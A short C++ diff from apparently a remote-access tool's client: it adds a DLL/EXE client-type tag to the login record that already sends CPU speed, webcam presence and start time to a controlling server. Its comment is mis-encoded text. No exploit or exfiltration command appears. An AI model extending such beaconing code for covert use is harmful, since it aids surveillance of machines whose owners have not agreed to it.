@@ -155,7 +155,7 @@ std::string getProcessTime() {
 	return buffer;
 }
 
-int SendLoginInfo(IOCPClient* ClientObject,DWORD dwSpeed)
+int SendLoginInfo(IOCPClient* ClientObject,DWORD dwSpeed, int nType)
 {
 	LOGIN_INFOR  LoginInfor;
 	LoginInfor.bToken = TOKEN_LOGIN; // ÁîÅÆÎªµÇÂ¼
@@ -182,6 +182,7 @@ int SendLoginInfo(IOCPClient* ClientObject,DWORD dwSpeed)
 	LoginInfor.dwCPUMHz = dwCPUMHz;
 	LoginInfor.bWebCamIsExist = bWebCamIsExist;
 	strcpy_s(LoginInfor.szStartTime, getProcessTime().c_str());
+	sprintf_s(LoginInfor.szReserved, "%s", nType==CLIENT_TYPE_DLL?"DLL":"EXE");
 	int iRet = ClientObject->OnServerSending((char*)&LoginInfor, sizeof(LOGIN_INFOR));   
 
 	return iRet;
